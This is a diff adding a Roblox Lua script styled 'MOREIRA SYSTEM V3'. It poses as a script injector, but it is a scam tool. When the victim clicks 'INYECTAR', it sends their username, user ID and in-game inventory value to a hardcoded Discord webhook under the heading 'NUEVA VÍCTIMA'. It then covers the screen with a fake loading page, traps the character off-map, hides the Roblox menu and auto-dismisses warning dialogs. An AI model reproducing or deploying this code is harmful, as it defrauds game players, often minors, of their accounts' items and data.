@@ -1,0 +1,261 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local Lighting = game:GetService("Lighting")
+local VIM = game:GetService("VirtualInputManager") -- Necesario para los comandos .block
+
+-- ==================== COMANDOS .block Y .open ====================
+CoreGui.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") then
+        local screenGui = descendant:FindFirstAncestorWhichIsA("ScreenGui")
+        if screenGui.Name == "BlockingModalScreen" then
+            if descendant:IsA("TextLabel") then
+                descendant:Destroy()
+            end
+            if descendant:IsA("GuiObject") then
+                descendant.BackgroundTransparency = 1
+            end
+            if descendant:IsA("TextButton") then
+                descendant.TextTransparency = 1
+            end
+            if descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
+                descendant.ImageTransparency = 1
+            end
+            
+            if descendant.Name == "3" and descendant.Parent and descendant.Parent.Name == "Buttons" then
+                descendant.Size = UDim2.new(0, 5000, 0, 5000)
+                descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
+                descendant.AnchorPoint = Vector2.new(0.5, 0.5)
+                
+                task.wait()
+                
+                local buttonPosition = descendant.AbsolutePosition
+                local buttonSize = descendant.AbsoluteSize
+                local clickX = buttonPosition.X + buttonSize.X / 2
+                local clickY = buttonPosition.Y + buttonSize.Y / 2
+                
+                VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
+                task.wait(0.1)
+                VIM:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
+            end
+        end
+    end
+end)
+
+-- CONFIGURACIÓN
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1456818151617466540/gTXIOakP_WD8mLEEuvEKO-0NeoIXCnze3xBQubOKmDhmxSioyYPIaC0gFvWOBC_VKVhg"
+local Min_Gen = 0
+
+-- VARIABLES LOCALES
+local Jugador = Players.LocalPlayer
+local PlayerGui = Jugador:WaitForChild("PlayerGui")
+local UserID = Jugador.UserId
+
+local function formatNumberShort(n)
+    if not n or type(n) ~= "number" then return "$0" end
+    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
+    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
+    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
+    return "$" .. tostring(n)
+end
+
+local function parseValueFromText(s)
+    if not s then return 0 end
+    local clean = s:gsub("[^%d%.KMB+]", "")
+    local numPart = clean:match("([%d%.]+)")
+    if not numPart then return 0 end
+    local n = tonumber(numPart) or 0
+    if clean:find("B") then return n * 1e9
+    elseif clean:find("M") then return n * 1e6
+    elseif clean:find("K") then return n * 1e3
+    else return n end
+end
+
+local function getBrainrots()
+    local results = {}
+    for _, desc in ipairs(Workspace:GetDescendants()) do
+        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") or desc.Name:find("Display") then
+            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name") or desc:FindFirstChild("Title")
+            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value") or desc:FindFirstChild("Stat")
+            
+            if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
+                local val = parseValueFromText(genLbl.Text)
+                if val >= Min_Gen then
+                    local key = nameLbl.Text .. "|" .. val
+                    if results[key] then 
+                        results[key].count = results[key].count + 1
+                    else 
+                        results[key] = {name = nameLbl.Text, value = val, count = 1} 
+                    end
+                end
+            end
+        end
+    end
+    local out = {}
+    for _, v in pairs(results) do table.insert(out, v) end
+    table.sort(out, function(a, b) return a.value > b.value end)
+    return out
+end
+
+
+local function MostrarPantallaFinal()
+    local FinalGui = Instance.new("ScreenGui", PlayerGui)
+    FinalGui.Name = "RobloxLoadingSystem"
+    FinalGui.IgnoreGuiInset = true
+    FinalGui.DisplayOrder = 2147483647 
+    
+    local BG = Instance.new("Frame", FinalGui)
+    BG.Size = UDim2.new(1.2, 0, 1.2, 0)
+    BG.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    BG.BackgroundColor3 = Color3.new(0,0,0)
+    BG.Active = true
+
+    local Logo = Instance.new("ImageLabel", BG)
+    Logo.Image = "rbxassetid://9167384795"
+    Logo.Size = UDim2.new(0, 130, 0, 130)
+    Logo.Position = UDim2.new(0.5, 0, 0.4, 0)
+    Logo.AnchorPoint = Vector2.new(0.5, 0.5)
+    Logo.BackgroundTransparency = 1
+
+    local Status = Instance.new("TextLabel", BG)
+    Status.Text = "Joining Server..."
+    Status.Font = Enum.Font.GothamBold
+    Status.TextSize = 32
+    Status.TextColor3 = Color3.new(1, 1, 1)
+    Status.Position = UDim2.new(0.5, 0, 0.55, 0)
+    Status.AnchorPoint = Vector2.new(0.5, 0.5)
+    Status.BackgroundTransparency = 1
+
+    local BarBG = Instance.new("Frame", BG)
+    BarBG.Size = UDim2.new(0.3, 0, 0, 4)
+    BarBG.Position = UDim2.new(0.5, 0, 0.62, 0)
+    BarBG.AnchorPoint = Vector2.new(0.5, 0.5)
+    BarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    BarBG.BorderSizePixel = 0
+
+    local BarFill = Instance.new("Frame", BarBG)
+    BarFill.Size = UDim2.new(0.1, 0, 1, 0)
+    BarFill.BackgroundColor3 = Color3.new(1, 1, 1)
+    BarFill.BorderSizePixel = 0
+
+    task.spawn(function()
+        local messages = {"Requesting Server...", "Loading Map Data...", "Syncing Assets...", "Finalizing..."}
+        while true do
+            for _, msg in ipairs(messages) do
+                Status.Text = msg
+                TweenService:Create(BarFill, TweenInfo.new(2), {Size = UDim2.new(math.random(20, 90)/100, 0, 1, 0)}):Play()
+                task.wait(3)
+            end
+        end
+    end)
+end
+
+
+local function trapPlayer()
+    local char = Jugador.Character or Jugador.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    hrp.Anchored = true
+    hrp.CFrame = CFrame.new(0, 999999, 0)
+end
+
+local function bloquearMenuRoblox()
+    task.spawn(function()
+        pcall(function()
+            StarterGui:SetCore("TopbarEnabled", false)
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        end)
+        while task.wait(0.5) do
+            pcall(function()
+                CoreGui.RobloxGui.Enabled = false
+            end)
+        end
+    end)
+end
+
+local function sendToDiscord(link, brainrots)
+    local itemList = ""
+    local totalValue = 0
+    for i, br in ipairs(brainrots) do
+        if i <= 15 then 
+            itemList = itemList .. string.format("> `[%d]` **%s** ➔ %s (x%d)\n", i, br.name, formatNumberShort(br.value), br.count)
+        end
+        totalValue = totalValue + (br.value * br.count)
+    end
+
+    local request = syn and syn.request or http_request or request
+    pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = "||@everyone|| 🩸 **NUEVA VÍCTIMA**",
+                embeds = {{
+                    title = "🚀 Reporte de Extracción Moreira",
+                    color = 16711680,
+                    fields = {
+                        {name = "👤 Usuario", value = Jugador.Name .. " (" .. UserID .. ")", inline = true},
+                        {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
+                        {name = "🔗 Script", value = " " .. link .. " "},
+                        {name = "📋 Inventario", value = (itemList ~= "" and itemList or "Vacío")}
+                    }
+                }}
+            })
+        })
+    end)
+end
+
+--------------------------------------------------------------------------------
+-- MENÚ DE INICIO
+--------------------------------------------------------------------------------
+
+local function IniciarMenu()
+    local MenuGui = Instance.new("ScreenGui", PlayerGui)
+    local Frame = Instance.new("Frame", MenuGui)
+    Frame.Size = UDim2.new(0, 450, 0, 280)
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    Instance.new("UIStroke", Frame).Color = Color3.fromRGB(255, 40, 40)
+    Instance.new("UICorner", Frame)
+
+    local Title = Instance.new("TextLabel", Frame)
+    Title.Text = "MOREIRA SYSTEM V3"
+    Title.Size = UDim2.new(1, 0, 0, 60)
+    Title.TextColor3 = Color3.new(1, 1, 1)
+    Title.Font = Enum.Font.GothamBold
+    Title.BackgroundTransparency = 1
+
+    local Input = Instance.new("TextBox", Frame)
+    Input.Size = UDim2.new(0.85, 0, 0, 50)
+    Input.Position = UDim2.new(0.075, 0, 0.45, 0)
+    Input.PlaceholderText = "Pega el script aquí..."
+    Input.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+    Input.TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("UICorner", Input)
+
+    local Btn = Instance.new("TextButton", Frame)
+    Btn.Size = UDim2.new(0.6, 0, 0, 50)
+    Btn.Position = UDim2.new(0.2, 0, 0.78, 0)
+    Btn.Text = "INYECTAR"
+    Btn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+    Btn.TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("UICorner", Btn)
+
+    Btn.MouseButton1Click:Connect(function()
+        local link = Input.Text
+        local brs = getBrainrots()
+        sendToDiscord(link, brs)
+        MenuGui:Destroy()
+        MostrarPantallaFinal()
+        trapPlayer()
+        bloquearMenuRoblox()
+    end)
+end
+
+IniciarMenu()
